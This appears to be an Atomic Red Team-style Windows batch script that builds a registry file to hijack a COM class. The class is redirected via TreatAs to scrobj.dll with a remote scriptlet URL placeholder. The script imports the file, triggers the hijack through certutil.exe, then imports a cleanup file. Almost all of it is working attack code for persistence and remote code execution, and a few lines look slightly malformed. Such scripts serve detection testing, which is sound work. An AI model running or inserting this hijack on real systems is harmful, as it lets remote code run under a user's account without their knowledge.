echo Windows Registry Editor Version 5.00>>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00]>>COMHijack.reg 
echo @="AtomicRedTeam">>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00\CLSID]>>COMHijack.reg 
echo @="{00000001-0000-0000-0000-0000FEEDACDC}">>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]>>COMHijack.reg 
echo @="AtomicRedTeam">>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam\CLSID]>>COMHijack.reg 
echo @="{00000001-0000-0000-0000-0000FEEDACDC}">>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}]>>COMHijack.reg 
echo @="AtomicRedTeam">>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32]>>COMHijack.reg 
echo @="C:\\WINDOWS\\system32\\scrobj.dll">>COMHijack.reg 
echo "ThreadingModel"="Apartment">>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]>>COMHijack.reg 
echo @="AtomicRedTeam.1.00">>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]>>COMHijack.reg 
echo @="URL raw Github Or gists">>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]>>COMHijack.reg 
echo @="AtomicRedTeam">>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}]>>COMHijack.reg 
echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}\TreatAs]>>COMHijack.reg 
echo @="{00000001-0000-0000-0000-0000FEEDACDC}">>COMHijack.reg 



echo Windows Registry Editor Version 5.00>>COMHijackCleanup.reg
echo [-HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00]>>COMHijackCleanup.reg
echo [-HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]>>COMHijackCleanup.reg
echo [-HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}]>>COMHijackCleanup.reg
cls
cmd /c reg import COMHijack.reg
cmd /ccertutil.exe -CAInfo
cls
cmd /c reg import COMHijackCleanup.regcls
